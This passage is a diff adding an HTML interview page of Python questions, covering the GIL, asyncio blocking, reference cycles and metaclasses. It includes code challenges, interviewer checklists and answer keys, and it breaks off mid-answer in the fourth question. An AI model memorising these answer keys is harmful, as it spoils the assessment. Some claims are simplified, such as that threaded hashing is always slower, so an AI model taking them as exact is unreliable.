@@ -1,0 +1,2579 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Python Core & AsyncIO | Technical Interview Suite</title>
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <!-- Sidebar Navigation -->
+    <aside class="sidebar">
+        <div class="brand">
+            <div class="brand-icon">⚡</div>
+            <div class="brand-title">
+                <h2>Interview Hub</h2>
+                <p>Architect &amp; Lead Level</p>
+            </div>
+        </div>
+        <ul class="nav-links">
+            <li><a href="index.html" class="nav-link"><span>🏠</span> Overview & Summary</a></li>
+            <li><a href="java.html" class="nav-link"><span>☕</span> Java & JVM <span class="nav-badge">20 Qs</span></a></li>
+            <li><a href="spring-spring-boot.html" class="nav-link"><span>🌱</span> Spring & Boot <span class="nav-badge">21 Qs</span></a></li>
+            <li><a href="orm-hibernate-jpa.html" class="nav-link"><span>🗄️</span> ORM, JPA & Hibernate <span class="nav-badge">20 Qs</span></a></li>
+            <li><a href="rest-api-microservices.html" class="nav-link"><span>🌐</span> REST & Microservices <span class="nav-badge">20 Qs</span></a></li>
+            <li><a href="aws-deployment.html" class="nav-link"><span>☁️</span> AWS (EC2 & Lambda) <span class="nav-badge">20 Qs</span></a></li>
+            <li><a href="angular.html" class="nav-link"><span>🅰️</span> Angular <span class="nav-badge">20 Qs</span></a></li>
+            <li><a href="architecture-design.html" class="nav-link"><span>📐</span> Architecture & Design <span class="nav-badge">20 Qs</span></a></li>
+            <li><a href="python-core.html" class="nav-link active"><span>🐍</span> Python Core & Async <span class="nav-badge">20 Qs</span></a></li>
+            <li><a href="python-web-frameworks.html" class="nav-link"><span>🚀</span> Django, FastAPI & Flask <span class="nav-badge">20 Qs</span></a></li>
+        </ul>
+    </aside>
+
+    <!-- Main Content Area -->
+    <main class="main-wrapper">
+        <header class="header">
+            <h1>🐍 Python Core, AsyncIO & System Internals</h1>
+            <p>20 Senior & Lead Level technical scenarios covering the GIL, AsyncIO event loop mechanics, CPython memory architecture, Descriptors, Metaclasses, and Structured Concurrency.</p>
+        </header>
+
+        <div class="content-container">
+
+            <!-- SKILL-LEVEL EVALUATION STICKY BAR -->
+            <div class="skill-evaluation-bar">
+                <div class="skill-eval-top-row">
+                    <div class="skill-title-block">
+                        <h3>🐍 Skill: Python Core & AsyncIO</h3>
+                        <p id="statEvaluatedCount">0 of 20 Questions Rated</p>
+                    </div>
+                    <div class="scorecard-actions" style="display: flex; gap: 8px;">
+                        <a href="index.html" class="btn-primary" style="padding: 6px 14px; font-size: 13px;">📋 Master Summary</a>
+                        <button class="btn-outline" style="padding: 6px 14px; font-size: 13px;" onclick="resetSkillData('python_core')">🔄 Reset</button>
+                    </div>
+                </div>
+                <div class="skill-eval-controls">
+                    <div style="display:flex; align-items:center; gap:12px; flex-wrap:wrap;">
+                        <span class="proficiency-label">Calculated Proficiency:</span>
+                        <span class="verdict-badge none" id="statVerdict">Not Rated Yet</span>
+                        <span style="font-size:12px; color:var(--text-muted);">Auto-calculated from 1–4 ratings below ↓ &nbsp;|&nbsp; Rate 3–5 questions — system will suggest HIRE or REJECT</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Guidelines Box -->
+            <div class="guideline-box">
+                <div class="icon">💡</div>
+                <div>
+                    <h3>How to Conduct This Interview</h3>
+                    <p>
+                        Choose <strong>3 to 5 questions</strong> from below. Click <strong>"💻 View Code Snippet"</strong> to open the challenge in a popup modal, and click <strong>"Copy to Clipboard"</strong> to paste it into your candidate's shared live coding pad.
+                        The code snippets contain <strong>no giveaway comments</strong>. Rate the candidate's response using the <strong>1 to 4 rating scale</strong> (Cannot Explain, Partial, Good, Expert). The system automatically calculates domain proficiency and the overall hiring recommendation.
+                    </p>
+                </div>
+            </div>
+
+            <!-- Search Filter Bar -->
+            <div class="filter-bar">
+                <input type="text" id="searchInput" class="search-input" placeholder="Search Python topics (e.g. gil, asyncio event loop, descriptors, memory leak, weakref, slots, metaclass, protocol)..." onkeyup="filterQuestions()">
+            </div>
+
+            
+            <!-- Quick Jump Question Navigator -->
+            <div class="quick-jump-container">
+                <div class="quick-jump-header">
+                    <span class="quick-jump-title">⚡ Quick Question Navigator (Jump to Question):</span>
+                    <span class="quick-jump-subtitle">Click any topic to scroll directly • Green indicates rated</span>
+                </div>
+                <div class="quick-jump-grid">
+                    <button class="jump-chip" id="jump-chip-1" onclick="scrollToQuestion(1)" title="Concurrency & Global Interpreter Lock (GIL)">Q1: GIL & Thread Contention</button>
+                    <button class="jump-chip" id="jump-chip-2" onclick="scrollToQuestion(2)" title="AsyncIO & Event Loop Architecture">Q2: AsyncIO Event Loop Starvation</button>
+                    <button class="jump-chip" id="jump-chip-3" onclick="scrollToQuestion(3)" title="Memory Management & Garbage Collection">Q3: Cyclic GC & Weakref Leaks</button>
+                    <button class="jump-chip" id="jump-chip-4" onclick="scrollToQuestion(4)" title="Metaprogramming & Class Construction">Q4: Metaclasses vs __init_subclass__</button>
+                    <button class="jump-chip" id="jump-chip-5" onclick="scrollToQuestion(5)" title="Descriptors Protocol & Attribute Lookup">Q5: Descriptor Protocol (__get__, __set__)</button>
+                    <button class="jump-chip" id="jump-chip-6" onclick="scrollToQuestion(6)" title="Generators & Memory Streaming">Q6: Generators & Memory Streaming</button>
+                    <button class="jump-chip" id="jump-chip-7" onclick="scrollToQuestion(7)" title="Context Managers & Exception Suppression">Q7: Context Managers & __exit__</button>
+                    <button class="jump-chip" id="jump-chip-8" onclick="scrollToQuestion(8)" title="Dynamic Attribute Dispatch & Magic Methods">Q8: __getattr__ vs __getattribute__</button>
+                    <button class="jump-chip" id="jump-chip-9" onclick="scrollToQuestion(9)" title="Memory Optimization & __slots__">Q9: Memory Optimization with __slots__</button>
+                    <button class="jump-chip" id="jump-chip-10" onclick="scrollToQuestion(10)" title="Advanced Type System & Protocols">Q10: Typing Protocols & Structural Subtyping</button>
+                    <button class="jump-chip" id="jump-chip-11" onclick="scrollToQuestion(11)" title="Mutability & Default Argument Traps">Q11: Mutable Default Argument Traps</button>
+                    <button class="jump-chip" id="jump-chip-12" onclick="scrollToQuestion(12)" title="Multiprocessing & Zero-Copy Shared Memory">Q12: Multiprocessing SharedMemory</button>
+                    <button class="jump-chip" id="jump-chip-13" onclick="scrollToQuestion(13)" title="Exception Handling & ExceptionGroups">Q13: ExceptionGroup & except* (Python 3.11)</button>
+                    <button class="jump-chip" id="jump-chip-14" onclick="scrollToQuestion(14)" title="AsyncIO Structured Concurrency & TaskGroups">Q14: Structured Concurrency & TaskGroup</button>
+                    <button class="jump-chip" id="jump-chip-15" onclick="scrollToQuestion(15)" title="Decorators, Signature Binding & functools.wraps">Q15: Decorators & functools.wraps</button>
+                    <button class="jump-chip" id="jump-chip-16" onclick="scrollToQuestion(16)" title="Abstract Base Classes & Virtual Subclasses">Q16: Abstract Base Classes & __subclasshook__</button>
+                    <button class="jump-chip" id="jump-chip-17" onclick="scrollToQuestion(17)" title="Bytecode & CPython Execution VM">Q17: Bytecode & CPython VM Opcode Execution</button>
+                    <button class="jump-chip" id="jump-chip-18" onclick="scrollToQuestion(18)" title="Clean Architecture & Dependency Injection">Q18: Clean Architecture & Dependency Injection</button>
+                    <button class="jump-chip" id="jump-chip-19" onclick="scrollToQuestion(19)" title="Security & Serialization Vulnerabilities">Q19: Pickle Remote Code Execution Hazards</button>
+                    <button class="jump-chip" id="jump-chip-20" onclick="scrollToQuestion(20)" title="Asynchronous Iterators & Streaming Backpressure">Q20: Async Iterators & Backpressure</button>
+                </div>
+            </div>
+<!-- Question Cards Container -->
+            <div class="questions-list">
+                <div class="question-card" id="q-1" data-keywords="gil global interpreter lock threading multiprocessing cpu bound io bound subinterpreters pep 703">
+                    <div class="card-header">
+                        <span class="concept-badge">Concurrency &amp; Global Interpreter Lock (GIL)</span>
+                        <span class="q-number">Question 1 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                The <strong>Global Interpreter Lock (GIL)</strong> in CPython: how it serializes bytecode execution across OS threads, impacts CPU-bound vs IO-bound workloads, and modern mitigations (multiprocessing, subinterpreters PEP 684, and free-threaded Python PEP 703).
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                A developer built an image processing microservice that computes cryptographic SHA-256 hashes of bulk file chunks. To speed up processing on an 8-core CPU, they wrapped the loop in 8 <code>threading.Thread</code> workers.
+<br><br>
+<strong>Part A:</strong> Why does running this CPU-intensive workload with 8 Python threads actually execute <em>slower</em> than a single-threaded loop on multi-core systems?
+<br>
+<strong>Part B:</strong> Explain how OS thread preemption, GIL contention, and cache thrashing create the 'convoy effect' in CPython CPU workloads.
+<br>
+<strong>Part C:</strong> Refactor the code to achieve true parallelism utilizing all CPU cores, and describe how Python 3.12+ subinterpreters (PEP 684) and Python 3.13 free-threaded mode (PEP 703) change this dynamic.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('1', 'hash_processor.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-1" style="display:none;">import threading
+import hashlib
+import time
+import os
+from typing import List
+
+def compute_chunk_hash(data: bytes) -&gt; str:
+    h = hashlib.sha256()
+    for _ in range(500_000):
+        h.update(data)
+    return h.hexdigest()
+
+def multi_threaded_hashing(payloads: List[bytes]) -&gt; List[str]:
+    results = [None] * len(payloads)
+    threads = []
+
+    def worker(idx: int, chunk: bytes):
+        results[idx] = compute_chunk_hash(chunk)
+
+    for i, payload in enumerate(payloads):
+        t = threading.Thread(target=worker, args=(i, payload))
+        threads.append(t)
+        t.start()
+
+    for t in threads:
+        t.join()
+        
+    return results</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-1">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 1, 1, 'The Global Interpreter Lock (GIL) in CPython: how it serializes bytecode execution across OS threads, impacts CPU-bound ')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 1, 2, 'The Global Interpreter Lock (GIL) in CPython: how it serializes bytecode execution across OS threads, impacts CPU-bound ')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 1, 3, 'The Global Interpreter Lock (GIL) in CPython: how it serializes bytecode execution across OS threads, impacts CPU-bound ')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 1, 4, 'The Global Interpreter Lock (GIL) in CPython: how it serializes bytecode execution across OS threads, impacts CPU-bound ')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-1">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate identify that CPU-bound Python threads contend for the single CPython GIL lock, preventing parallel execution on multiple cores?</li>
+<li>Do they explain the overhead of OS thread context switching and GIL acquisition signals (check_interval / sys.setswitchinterval)?</li>
+<li>Do they refactor to <code>concurrent.futures.ProcessPoolExecutor</code> or <code>multiprocessing.Pool</code> to bypass the GIL with independent memory spaces?</li>
+<li>Can they contrast CPU-bound GIL bottlenecks with I/O-bound workloads (where C extensions and socket syscalls release the GIL)?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. Why Multithreading Degrades CPU-Bound Python Performance:</strong><br>
+CPython enforces a Global Interpreter Lock (GIL) ensuring only one native OS thread executes Python bytecode at any instant. When 8 threads run CPU-bound loops, all 8 threads contend for the single GIL mutex. Every 5 milliseconds (<code>sys.getswitchinterval()</code>), the interpreter forces the running thread to release the lock. The OS scheduler wakes up other threads, resulting in massive context-switching overhead, CPU cache line invalidation, and thread starvation (the 'convoy effect'). Consequently, 8 CPU threads take <em>longer</em> than 1 thread.<br><br>
+<strong>2. Production Solution with ProcessPoolExecutor:</strong><br>
+<pre><code>from concurrent.futures import ProcessPoolExecutor
+from typing import List
+
+def parallel_hashing(payloads: List[bytes]) -> List[str]:
+    # Distribute work across isolated Python processes with independent GILs
+    with ProcessPoolExecutor(max_workers=os.cpu_count()) as executor:
+        return list(executor.map(compute_chunk_hash, payloads))</code></pre><br>
+<strong>3. Modern Architectural Evolution:</strong><br>
+• <strong>PEP 684 (Python 3.12+):</strong> Per-interpreter GIL allows subinterpreters in the same OS process to run concurrently without GIL sharing.<br>
+• <strong>PEP 703 (Python 3.13+):</strong> Free-threaded CPython replaces the global GIL with fine-grained biased locking on objects and immortal objects, enabling true multithreaded CPU parallelism.
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-2" data-keywords="asyncio event loop blocking calls requests sleep run_in_executor to_thread httpx">
+                    <div class="card-header">
+                        <span class="concept-badge">AsyncIO &amp; Event Loop Architecture</span>
+                        <span class="q-number">Question 2 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                The <strong>AsyncIO Single-Threaded Cooperative Event Loop</strong>: how blocking synchronous calls freeze all concurrent coroutines, and the exact mechanics of offloading blocking I/O and CPU work using <code>asyncio.to_thread</code> and native async clients.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                A high-concurrency payment notification webhook is built with <code>asyncio</code>. During a high-traffic flash sale, all connected WebSocket clients suddenly experience connection drops and timeout alerts. Look at the code.
+<br><br>
+<strong>Part A:</strong> Identify the critical architectural flaw in <code>process_payment_webhook()</code> that halts all other concurrent coroutines across the entire server process.
+<br>
+<strong>Part B:</strong> Differentiate between cooperative multitasking (coroutine suspension via <code>await</code>) and preemptive multitasking. Why does <code>requests.post()</code> completely prevent the event loop from scheduling other tasks?
+<br>
+<strong>Part C:</strong> Refactor this code using both non-blocking async HTTP clients (<code>httpx.AsyncClient</code>) and <code>asyncio.to_thread()</code> for legacy synchronous operations.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('2', 'payment_webhook.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-2" style="display:none;">import asyncio
+import time
+import requests
+from typing import Dict, Any
+
+class PaymentNotificationService:
+    def __init__(self, crm_url: str):
+        self.crm_url = crm_url
+
+    async def process_payment_webhook(self, event_data: Dict[str, Any]) -&gt; Dict[str, str]:
+        # Step 1: Simulate validation delay
+        time.sleep(0.5) 
+
+        # Step 2: Synchronous HTTP request to legacy internal CRM
+        response = requests.post(
+            f&quot;{self.crm_url}/api/v1/ledger&quot;,
+            json=event_data,
+            timeout=5.0
+        )
+        
+        # Step 3: Database ledger recording
+        return {&quot;status&quot;: &quot;SUCCESS&quot;, &quot;crm_code&quot;: str(response.status_code)}</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-2">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 2, 1, 'The AsyncIO Single-Threaded Cooperative Event Loop: how blocking synchronous calls freeze all concurrent coroutines, and')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 2, 2, 'The AsyncIO Single-Threaded Cooperative Event Loop: how blocking synchronous calls freeze all concurrent coroutines, and')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 2, 3, 'The AsyncIO Single-Threaded Cooperative Event Loop: how blocking synchronous calls freeze all concurrent coroutines, and')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 2, 4, 'The AsyncIO Single-Threaded Cooperative Event Loop: how blocking synchronous calls freeze all concurrent coroutines, and')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-2">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate identify that <code>time.sleep(0.5)</code> and <code>requests.post(...)</code> are synchronous blocking system calls?</li>
+<li>Do they explain that AsyncIO runs on a single OS thread; blocking that thread starves the event loop, freezing all other concurrent tasks/requests?</li>
+<li>Do they replace <code>time.sleep</code> with <code>await asyncio.sleep</code> and <code>requests</code> with <code>httpx.AsyncClient</code> or <code>aiohttp</code>?</li>
+<li>Do they show how to correctly wrap legacy sync blocking code using <code>await asyncio.to_thread(...)</code>?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. Root Cause Analysis:</strong><br>
+AsyncIO relies on <em>cooperative multitasking</em> executed on a single OS thread. The event loop can only switch contexts when a coroutine explicitly yields control back to the loop via <code>await</code> on an awaitable object. When <code>time.sleep()</code> or <code>requests.post()</code> is called, the OS thread enters a blocking syscall. The event loop is completely frozen; it cannot tick, process incoming network frames, or serve other client WebSockets.<br><br>
+<strong>2. Refactored Non-Blocking Architecture:</strong><br>
+<pre><code>import asyncio
+import httpx
+from typing import Dict, Any
+
+class PaymentNotificationService:
+    def __init__(self, crm_url: str):
+        self.crm_url = crm_url
+        self.client = httpx.AsyncClient(timeout=5.0)
+
+    async def process_payment_webhook(self, event_data: Dict[str, Any]) -> Dict[str, str]:
+        # Non-blocking asynchronous sleep yields execution back to the loop
+        await asyncio.sleep(0.5)
+
+        # Async HTTP client yields execution during I/O wait
+        response = await self.client.post(
+            f"{self.crm_url}/api/v1/ledger",
+            json=event_data
+        )
+
+        return {"status": "SUCCESS", "crm_code": str(response.status_code)}
+
+    # For legacy sync functions that cannot be converted to async:
+    async def invoke_legacy_blocking(self, event_data: Dict[str, Any]) -> None:
+        # Offload to worker thread pool without blocking event loop thread
+        await asyncio.to_thread(legacy_sync_worker, event_data)</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-3" data-keywords="garbage collection gc reference counting circular reference weakref del __del__ memory leak">
+                    <div class="card-header">
+                        <span class="concept-badge">Memory Management &amp; Garbage Collection</span>
+                        <span class="q-number">Question 3 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                CPython <strong>Memory Management & Garbage Collection</strong>: Reference counting mechanism, the cyclic garbage collector (Generations 0, 1, 2), memory leaks caused by circular references with <code>__del__</code>, and breaking cycles with <code>weakref</code>.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                An in-memory session and user event tracker consumes 4GB of RAM and never releases it, eventually getting killed by the OS Out-Of-Memory (OOM) killer. Look at the code.
+<br><br>
+<strong>Part A:</strong> Explain why the reference count of <code>Session</code> and <code>UserTracker</code> instances never drops to zero even when <code>del session</code> is called.
+<br>
+<strong>Part B:</strong> How does CPython's generational cyclic garbage collector work (Gen 0, 1, 2 heuristics)? Why did defining a custom <code>__del__</code> method historically break cyclic GC in Python?
+<br>
+<strong>Part C:</strong> Refactor this design using <code>weakref.ref</code> or <code>weakref.proxy</code> to break the reference cycle and guarantee immediate deallocation upon session termination.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('3', 'session_tracker.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-3" style="display:none;">import sys
+import gc
+from typing import Optional
+
+class UserTracker:
+    def __init__(self, user_id: str):
+        self.user_id = user_id
+        self.current_session: Optional[&#x27;Session&#x27;] = None
+
+    def __del__(self):
+        print(f&quot;Purging UserTracker: {self.user_id}&quot;)
+
+class Session:
+    def __init__(self, session_id: str, tracker: UserTracker):
+        self.session_id = session_id
+        self.tracker = tracker
+        self.tracker.current_session = self # Strong circular reference!
+
+    def __del__(self):
+        print(f&quot;Purging Session: {self.session_id}&quot;)
+
+def create_and_destroy():
+    tracker = UserTracker(&quot;user_101&quot;)
+    session = Session(&quot;sess_abc&quot;, tracker)
+    del tracker
+    del session # Memory is NOT reclaimed immediately!</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-3">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 3, 1, 'CPython Memory Management & Garbage Collection: Reference counting mechanism, the cyclic garbage collector (Generations ')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 3, 2, 'CPython Memory Management & Garbage Collection: Reference counting mechanism, the cyclic garbage collector (Generations ')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 3, 3, 'CPython Memory Management & Garbage Collection: Reference counting mechanism, the cyclic garbage collector (Generations ')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 3, 4, 'CPython Memory Management & Garbage Collection: Reference counting mechanism, the cyclic garbage collector (Generations ')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-3">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate explain CPython's primary memory management is Reference Counting (immediate deallocation when refcount reaches 0)?</li>
+<li>Do they identify the strong bidirectional cycle: <code>session -> tracker</code> and <code>tracker -> session</code> keeps refcounts at 1+?</li>
+<li>Do they explain generational GC (Gen 0 threshold triggers collection of unreachable cyclic objects)?</li>
+<li>Do they solve the problem using <code>weakref.ref</code> so the back-reference does not increment the reference count?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. Reference Counting vs Cyclic GC:</strong><br>
+Every Python object tracks its reference count in <code>ob_refcnt</code>. When <code>tracker.current_session = self</code> is assigned, a circular reference is established: <code>session</code> references <code>tracker</code>, and <code>tracker</code> references <code>session</code>. When <code>del tracker</code> and <code>del session</code> are called in local scope, their ref counts drop from 2 to 1—never reaching 0. They cannot be freed by reference counting.<br><br>
+<strong>2. Generational GC & __del__ Pitfall:</strong><br>
+CPython's cyclic GC periodically scans container objects across 3 generations based on allocation thresholds. Prior to Python 3.4 (PEP 442), cyclic GC could not safely collect cycles containing objects with <code>__del__</code> methods because the interpreter could not determine safe destruction ordering, depositing them in <code>gc.garbage</code> (permanent leak). Even with PEP 442, reference cycles delay reclamation until a full GC sweep.<br><br>
+<strong>3. Clean Solution with weakref:</strong><br>
+<pre><code>import weakref
+from typing import Optional
+
+class UserTracker:
+    def __init__(self, user_id: str):
+        self.user_id = user_id
+        self._current_session = None
+
+    @property
+    def current_session(self) -> Optional['Session']:
+        return self._current_session() if self._current_session else None
+
+    @current_session.setter
+    def current_session(self, sess: 'Session'):
+        # Store a weak reference: does not increment sess ob_refcnt
+        self._current_session = weakref.ref(sess) if sess is not None else None</code></pre>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="question-card" id="q-4" data-keywords="metaclass __new__ __init__ __init_subclass__ type class creation api validation">
+                    <div class="card-header">
+                        <span class="concept-badge">Metaprogramming &amp; Class Construction</span>
+                        <span class="q-number">Question 4 of 20</span>
+                    </div>
+                    <div class="card-body">
+                        <div class="section-block">
+                            <div class="section-title">📌 1. Concept Covered</div>
+                            <div class="concept-text">
+                                Python <strong>Class Construction & Metaprogramming</strong>: Understanding the class creation lifecycle (<code>type.__new__</code> vs <code>type.__init__</code>), enforcing architectural contracts at import-time, and replacing complex metaclasses with modern <code>__init_subclass__</code>.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">❓ 2. Question</div>
+                            <div class="question-title">
+                                You are designing a core banking plugin architecture. Every financial plugin subclass must implement an <code>execute_transaction()</code> method and define a class-level <code>PLUGIN_VERSION: str</code> attribute. If a developer omits them, the failure must occur at <em>import time</em>, not at runtime when customer money is moving.
+<br><br>
+<strong>Part A:</strong> Explain the exact sequence of events when Python executes a <code>class</code> definition: <code>__prepare__</code>, class body execution, and <code>metaclass.__new__</code>.
+<br>
+<strong>Part B:</strong> Show how to enforce this contract using a custom <code>type</code> Metaclass.
+<br>
+<strong>Part C:</strong> Why does modern Python (3.6+) prefer <code>__init_subclass__</code> over metaclasses for 90% of class validation use-cases? Implement the same validation using <code>__init_subclass__</code>.
+                            </div>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">💻 3. Code Challenge</div>
+                            <button class="btn-view-code" onclick="openCodeSnippetModal('4', 'plugin_framework.py')">
+                                💻 View Code Snippet (Popup)
+                            </button>
+                            <div id="snippet-4" style="display:none;">from typing import Dict, Any, Type
+
+# Legacy attempt using basic inheritance
+class BasePaymentPlugin:
+    PLUGIN_VERSION: str = &quot;&quot;
+
+    def execute_transaction(self, account_id: str, amount: float) -&gt; bool:
+        raise NotImplementedError(&quot;Subclasses must implement execute_transaction&quot;)
+
+# Problem: This invalid class loads into memory without error at startup!
+class CryptoPaymentPlugin(BasePaymentPlugin):
+    # Missing PLUGIN_VERSION
+    # Missing execute_transaction
+    pass</div>
+                        </div>
+
+                        <!-- 1-4 Answer Quality Rating Panel -->
+                        <div class="question-rating-panel">
+                            <span class="rating-panel-label">🎯 Answer Quality:</span>
+                            <div class="star-rating-group" id="star-group-4">
+                                <button class="star-btn" data-rating="1" onclick="setQuestionRating('python_core', 4, 1, 'Python Class Construction & Metaprogramming: Understanding the class creation lifecycle (type.__new__ vs type.__init__),')">
+                                    <span class="star-num">1</span>
+                                    <span class="star-label">Cannot Explain</span>
+                                </button>
+                                <button class="star-btn" data-rating="2" onclick="setQuestionRating('python_core', 4, 2, 'Python Class Construction & Metaprogramming: Understanding the class creation lifecycle (type.__new__ vs type.__init__),')">
+                                    <span class="star-num">2</span>
+                                    <span class="star-label">Partial</span>
+                                </button>
+                                <button class="star-btn" data-rating="3" onclick="setQuestionRating('python_core', 4, 3, 'Python Class Construction & Metaprogramming: Understanding the class creation lifecycle (type.__new__ vs type.__init__),')">
+                                    <span class="star-num">3</span>
+                                    <span class="star-label">Good</span>
+                                </button>
+                                <button class="star-btn" data-rating="4" onclick="setQuestionRating('python_core', 4, 4, 'Python Class Construction & Metaprogramming: Understanding the class creation lifecycle (type.__new__ vs type.__init__),')">
+                                    <span class="star-num">4</span>
+                                    <span class="star-label">Expert</span>
+                                </button>
+                            </div>
+                            <span class="q-score-display" id="q-score-4">Not Rated</span>
+                        </div>
+
+                        <div class="section-block">
+                            <div class="section-title">🔍 4. Concept Check Evaluation</div>
+                            <ul class="concept-check-list">
+                                <li>Does candidate articulate the class creation lifecycle: <code>metaclass.__prepare__</code> -> namespace evaluation -> <code>metaclass.__new__</code> -> <code>metaclass.__init__</code>?</li>
+<li>Do they write a valid Metaclass overriding <code>__new__(mcs, name, bases, namespace)</code> that raises <code>TypeError</code> if attributes are missing?</li>
+<li>Do they explain metaclass collision problems when multiple base classes define conflicting metaclasses?</li>
+<li>Do they implement <code>__init_subclass__(cls, **kwargs)</code> cleanly without metaclass overhead?</li>
+                            </ul>
+                        </div>
+
+                        <!-- Collapsible Solution Drawer -->
+                        <button class="solution-toggle" onclick="toggleSolution(this)">
+                            <span>💡 5. Expected Senior / Lead Answer &amp; Architecture Trade-offs</span>
+                            <span>▼</span>
+                        </button>
+                        <div class="solution-content">
+                            <div class="solution-heading">Answer Key &amp; Deep-Dive Explanation</div>
+                            <strong>1. Class Construction Lifecycle:</strong><br>
